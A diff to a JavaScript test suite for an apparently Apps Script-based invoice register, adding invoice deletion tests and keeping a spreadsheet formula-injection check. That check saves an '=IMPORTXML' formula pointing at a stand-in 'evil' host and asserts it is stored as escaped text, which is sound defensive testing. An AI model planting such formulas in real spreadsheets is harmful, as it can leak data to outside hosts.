@@ -19,7 +19,7 @@ function fakeGoogle() {
       setValues: vs => vs.forEach((row, i) => row.forEach((v, j) => { (rows[r + i - 1] ??= [])[c + j - 1] = v; })),
       setNumberFormat: () => {}, setFontWeight: () => {},
     });
-    return { name, rows, appendRow: row => rows.push([...row]), getLastRow: () => rows.length, getMaxRows: () => 1000, getRange: range, setFrozenRows: () => {} };
+    return { name, rows, deleteRow: r => rows.splice(r - 1, 1), appendRow: row => rows.push([...row]), getLastRow: () => rows.length, getMaxRows: () => 1000, getRange: range, setFrozenRows: () => {} };
   };
   const props = new Map();
   return {
@@ -81,8 +81,17 @@ test('Apps Script register: numbering, statuses and safety', () => {
   assert.equal(opened.invoice.clientName, 'Kofi');
   assert.equal(opened.invoice.number, second.number);
 
+  // Deleting removes the invoice and its order; the number is not reused.
+  assert.equal(sheets.call({ action: 'delete', number: first.number }).ok, true);
+  assert.equal(sheets.call({ action: 'get', number: first.number }).error, 'unknown invoice');
+  assert.equal(sheets.call({ action: 'delete', number: first.number }).error, 'unknown invoice');
+  assert.equal(orders.rows.length, 1, 'order row removed, header kept');
+  assert.deepEqual(sheets.call({ action: 'list' }).invoices.map(row => row.number), [second.number]);
+  assert.equal(sheets.call({ action: 'save', order: order() }).number, `GC-${year}-0003`, 'deleted numbers are not reissued');
+  assert.equal(sheets.call({ action: 'delete', number: second.number }).ok, true, 'quotes without an order row delete too');
+
   // Formula-like text is stored as plain text.
   sheets.call({ action: 'save', order: order('', '=IMPORTXML("http://evil","//a")') });
-  assert.equal(invoices.rows[3][6], '\'=IMPORTXML("http://evil","//a")');
-  assert.equal(invoices.rows[3][7], "'+233 24 000 0000", 'phone numbers stay text too');
+  assert.equal(invoices.rows.at(-1)[6], '\'=IMPORTXML("http://evil","//a")');
+  assert.equal(invoices.rows.at(-1)[7], "'+233 24 000 0000", 'phone numbers stay text too');
 });
